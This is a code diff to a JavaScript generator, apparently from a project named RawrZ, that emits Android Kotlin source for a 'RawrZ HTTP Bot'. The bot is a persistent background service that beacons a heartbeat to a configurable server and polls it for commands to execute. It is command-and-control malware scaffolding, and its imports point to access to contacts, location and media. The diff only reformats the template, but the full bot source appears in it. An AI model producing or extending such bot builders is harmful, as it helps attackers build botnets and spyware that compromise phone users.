@@ -860,106 +860,107 @@ class HTTPBotGenerator {
     generateKotlinHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateKotlinFeatures(features);
         
-        return `// RawrZ HTTP Bot - Kotlin Implementation (Android)
-// Generated: ${timestamp}
-// Bot ID: ${botId}
-
-package com.rawrz.httpbot
-
-import android.Manifest
-import android.app.Service
-import android.content.Context
-import android.content.Intent
-import android.content.pm.PackageManager
-import android.location.LocationManager
-import android.os.IBinder
-import android.provider.ContactsContract
-import android.provider.MediaStore
-import androidx.core.app.ActivityCompat
-import kotlinx.coroutines.*
-import org.json.JSONObject
-import java.io.*
-import java.net.HttpURLConnection
-import java.net.URL
-import java.util.*
-
-class RawrZHTTPBot : Service() {
-    private val serverUrl = "${config.server || 'http://localhost:8080'}"
-    private val botId = "${botId}"
-    private val botName = "${config.name || 'HTTPBot'}"
-    private var isRunning = false
-    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    
-    override fun onCreate() {
-        super.onCreate()
-        ${featureCode.init}
-    }
-    
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startBot()
-        return START_STICKY
-    }
-    
-    private fun startBot() {
-        println("RawrZ HTTP Bot \$botId starting...")
-        isRunning = true
+        return '// RawrZ HTTP Bot - Kotlin Implementation (Android)\n' +
         
-        scope.launch {
-            while (isRunning) {
-                sendHeartbeat()
-                checkForCommands()
-                ${featureCode.execute}
-                delay(5000)
-            }
-        }
-    }
-    
-    private suspend fun sendHeartbeat() {
-        val data = JSONObject().apply {
-            put("bot_id", botId)
-            put("status", "alive")
-            put("timestamp", System.currentTimeMillis())
-        }
-        sendHTTPRequest("/bot/heartbeat", data.toString())
-    }
-    
-    private suspend fun checkForCommands() {
-        val response = sendHTTPRequest("/bot/commands/\$botId", null)
-        if (response.isNotEmpty()) {
-            executeCommand(response)
-        }
-    }
-    
-    private fun executeCommand(command: String) {
-        println("Executing command: \$command")
-        // Command execution logic here
-    }
-    
-    private suspend fun sendHTTPRequest(endpoint: String, data: String?): String {
-        return withContext(Dispatchers.IO) {
-            try {
-                val url = URL(serverUrl + endpoint)
-                val connection = url.openConnection() as HttpURLConnection
-                connection.requestMethod = if (data != null) "POST" else "GET"
-                connection.setRequestProperty("Content-Type", "application/json")
-                
-                if (data != null) {
-                    connection.doOutput = true
-                    connection.outputStream.use { it.write(data.toByteArray()) }
-                }
-                
-                connection.inputStream.bufferedReader().use { it.readText() }
-            } catch (e: Exception) {
-                println("HTTP request failed: \${e.message}")
-                ""
-            }
-        }
-    }
-    
-    " + featureCode.methods + "
-    
-    override fun onBind(intent: Intent?): IBinder? = null
-}`;
+            '// Generated: ' + timestamp + '\n' +
+            '// Bot ID: ' + botId + '\n' +
+            '\n' +
+            'package com.rawrz.httpbot\n' +
+            '\n' +
+            'import android.Manifest\n' +
+            'import android.app.Service\n' +
+            'import android.content.Context\n' +
+            'import android.content.Intent\n' +
+            'import android.content.pm.PackageManager\n' +
+            'import android.location.LocationManager\n' +
+            'import android.os.IBinder\n' +
+            'import android.provider.ContactsContract\n' +
+            'import android.provider.MediaStore\n' +
+            'import androidx.core.app.ActivityCompat\n' +
+            'import kotlinx.coroutines.*\n' +
+            'import org.json.JSONObject\n' +
+            'import java.io.*\n' +
+            'import java.net.HttpURLConnection\n' +
+            'import java.net.URL\n' +
+            'import java.util.*\n' +
+            '\n' +
+            'class RawrZHTTPBot : Service() {\n' +
+            '    private val serverUrl = "' + (config.server || 'http://localhost:8080') + '"\n' +
+            '    private val botId = "' + botId + '"\n' +
+            '    private val botName = "' + (config.name || 'HTTPBot') + '"\n' +
+            '    private var isRunning = false\n' +
+            '    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())\n' +
+            '    \n' +
+            '    override fun onCreate() {\n' +
+            '        super.onCreate()\n' +
+            '        ' + featureCode.init + '\n' +
+            '    }\n' +
+            '    \n' +
+            '    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {\n' +
+            '        startBot()\n' +
+            '        return START_STICKY\n' +
+            '    }\n' +
+            '    \n' +
+            '    private fun startBot() {\n' +
+            '        println("RawrZ HTTP Bot " + botId + " starting...")\n' +
+            '        isRunning = true\n' +
+            '        \n' +
+            '        scope.launch {\n' +
+            '            while (isRunning) {\n' +
+            '                sendHeartbeat()\n' +
+            '                checkForCommands()\n' +
+            '                ' + featureCode.execute + '\n' +
+            '                delay(5000)\n' +
+            '            }\n' +
+            '        }\n' +
+            '    }\n' +
+            '    \n' +
+            '    private suspend fun sendHeartbeat() {\n' +
+            '        val data = JSONObject().apply {\n' +
+            '            put("bot_id", botId)\n' +
+            '            put("status", "alive")\n' +
+            '            put("timestamp", System.currentTimeMillis())\n' +
+            '        }\n' +
+            '        sendHTTPRequest("/bot/heartbeat", data.toString())\n' +
+            '    }\n' +
+            '    \n' +
+            '    private suspend fun checkForCommands() {\n' +
+            '        val response = sendHTTPRequest("/bot/commands/" + botId, null)\n' +
+            '        if (response.isNotEmpty()) {\n' +
+            '            executeCommand(response)\n' +
+            '        }\n' +
+            '    }\n' +
+            '    \n' +
+            '    private fun executeCommand(command: String) {\n' +
+            '        println("Executing command: " + command)\n' +
+            '        // Command execution logic here\n' +
+            '    }\n' +
+            '    \n' +
+            '    private suspend fun sendHTTPRequest(endpoint: String, data: String?): String {\n' +
+            '        return withContext(Dispatchers.IO) {\n' +
+            '            try {\n' +
+            '                val url = URL(serverUrl + endpoint)\n' +
+            '                val connection = url.openConnection() as HttpURLConnection\n' +
+            '                connection.requestMethod = if (data != null) "POST" else "GET"\n' +
+            '                connection.setRequestProperty("Content-Type", "application/json")\n' +
+            '                \n' +
+            '                if (data != null) {\n' +
+            '                    connection.doOutput = true\n' +
+            '                    connection.outputStream.use { it.write(data.toByteArray()) }\n' +
+            '                }\n' +
+            '                \n' +
+            '                connection.inputStream.bufferedReader().use { it.readText() }\n' +
+            '            } catch (e: Exception) {\n' +
+            '                println("HTTP request failed: " + e.message)\n' +
+            '                ""\n' +
+            '            }\n' +
+            '        }\n' +
+            '    }\n' +
+            '    \n' +
+            '    ' + featureCode.methods + '\n' +
+            '    \n' +
+            '    override fun onBind(intent: Intent?): IBinder? = null\n' +
+            '}';
     }
 
     generateKotlinFeatures(features) {
